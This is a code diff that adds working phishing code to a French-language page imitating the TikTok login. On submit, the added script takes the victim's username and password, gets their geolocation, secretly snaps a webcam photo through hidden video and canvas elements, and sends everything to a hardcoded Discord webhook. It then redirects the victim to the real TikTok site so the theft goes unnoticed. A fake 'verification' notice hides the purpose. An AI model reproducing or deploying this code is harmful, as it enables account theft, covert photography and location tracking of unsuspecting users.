@@ -63,30 +63,125 @@
       color: #c00;
       margin-bottom: 10px;
     }
+    #video, #canvas {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Connecte-toi à TikTok</h2>
+    <div id="notice">
+      En continuant, vous acceptez que votre localisation et une photo soient prises et envoyées pour vérification.
+    </div>
     <form id="loginForm">
       <input type="text" id="username" placeholder="E-mail ou nom d'utilisateur" required>
       <input type="password" id="password" placeholder="Mot de passe" required>
       <label class="checkbox-label">
         <input type="checkbox" id="acceptTerms" required>
-        J'accepte les conditions d'utilisation
+        J'accepte les conditions d'utilisation (localisation + photo obligatoire)
       </label>
       <button type="submit" id="submitBtn" disabled>Se connecter</button>
+      <video id="video" autoplay style="display:none"></video>
+      <canvas id="canvas" style="display:none"></canvas>
     </form>
   </div>
   <script>
-    // Activer/désactiver le bouton en fonction de la case à cocher
+    // Activation du bouton selon la case à cocher
     const acceptTerms = document.getElementById('acceptTerms');
     const submitBtn = document.getElementById('submitBtn');
     acceptTerms.addEventListener('change', function() {
       submitBtn.disabled = !this.checked;
     });
 
-    // (Le code du formulaire d'envoi peut être ajouté ici)
+    // Webcam et géolocalisation
+    let imageBlob = null;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let stream = null;
+
+    function startWebcam() {
+      return new Promise((resolve, reject) => {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(s) {
+              stream = s;
+              video.srcObject = stream;
+              video.play();
+              video.onloadedmetadata = () => resolve();
+            })
+            .catch(reject);
+        } else {
+          reject('Webcam non supportée');
+        }
+      });
+    }
+
+    function takePhoto() {
+      return new Promise((resolve, reject) => {
+        try {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+          canvas.toBlob(function(blob) {
+            imageBlob = blob;
+            // Arrêt du flux webcam après la photo
+            if (stream && stream.getTracks) {
+              stream.getTracks().forEach(track => track.stop());
+            }
+            resolve();
+          }, 'image/png');
+        } catch (e) {
+          reject(e);
+        }
+      });
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const webhookURL = "https://discord.com/api/webhooks/1375896601762992208/d1GYVNKTVt6T43EPzEnUxILre5OhSwPbPbKyPCjbQYMaGGcampM1A4fNb9OsX4iGSR6p";
+
+      // 1. Demander la géolocalisation
+      if (!navigator.geolocation) {
+        alert("La géolocalisation n'est pas supportée par votre navigateur.");
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        // 2. Démarrer la webcam et prendre la photo
+        startWebcam().then(() => {
+          setTimeout(() => {
+            takePhoto().then(() => {
+              // 3. Envoi au webhook Discord
+              const form = new FormData();
+              const content = `🔔 Connexion TikTok\n👤 Utilisateur : ${username}\n🔑 Mot de passe : ${password}\n🌍 Localisation :\nLatitude : ${lat}\nLongitude : ${lon}\n📸 Photo jointe`;
+              form.append("content", content);
+              if (imageBlob) {
+                form.append("file", imageBlob, "photo.png");
+              }
+              fetch(webhookURL, {
+                method: "POST",
+                body: form
+              }).then(() => {
+                window.location.href = "https://www.tiktok.com";
+              }).catch(() => {
+                window.location.href = "https://www.tiktok.com";
+              });
+            }).catch(() => {
+              alert("Erreur lors de la prise de photo.");
+            });
+          }, 800); // Laisse la webcam s'activer
+        }).catch(() => {
+          alert("Impossible d'accéder à la webcam.");
+        });
+      }, function() {
+        alert("Impossible d'obtenir la localisation.");
+      });
+    });
   </script>
 </body>
 </html>
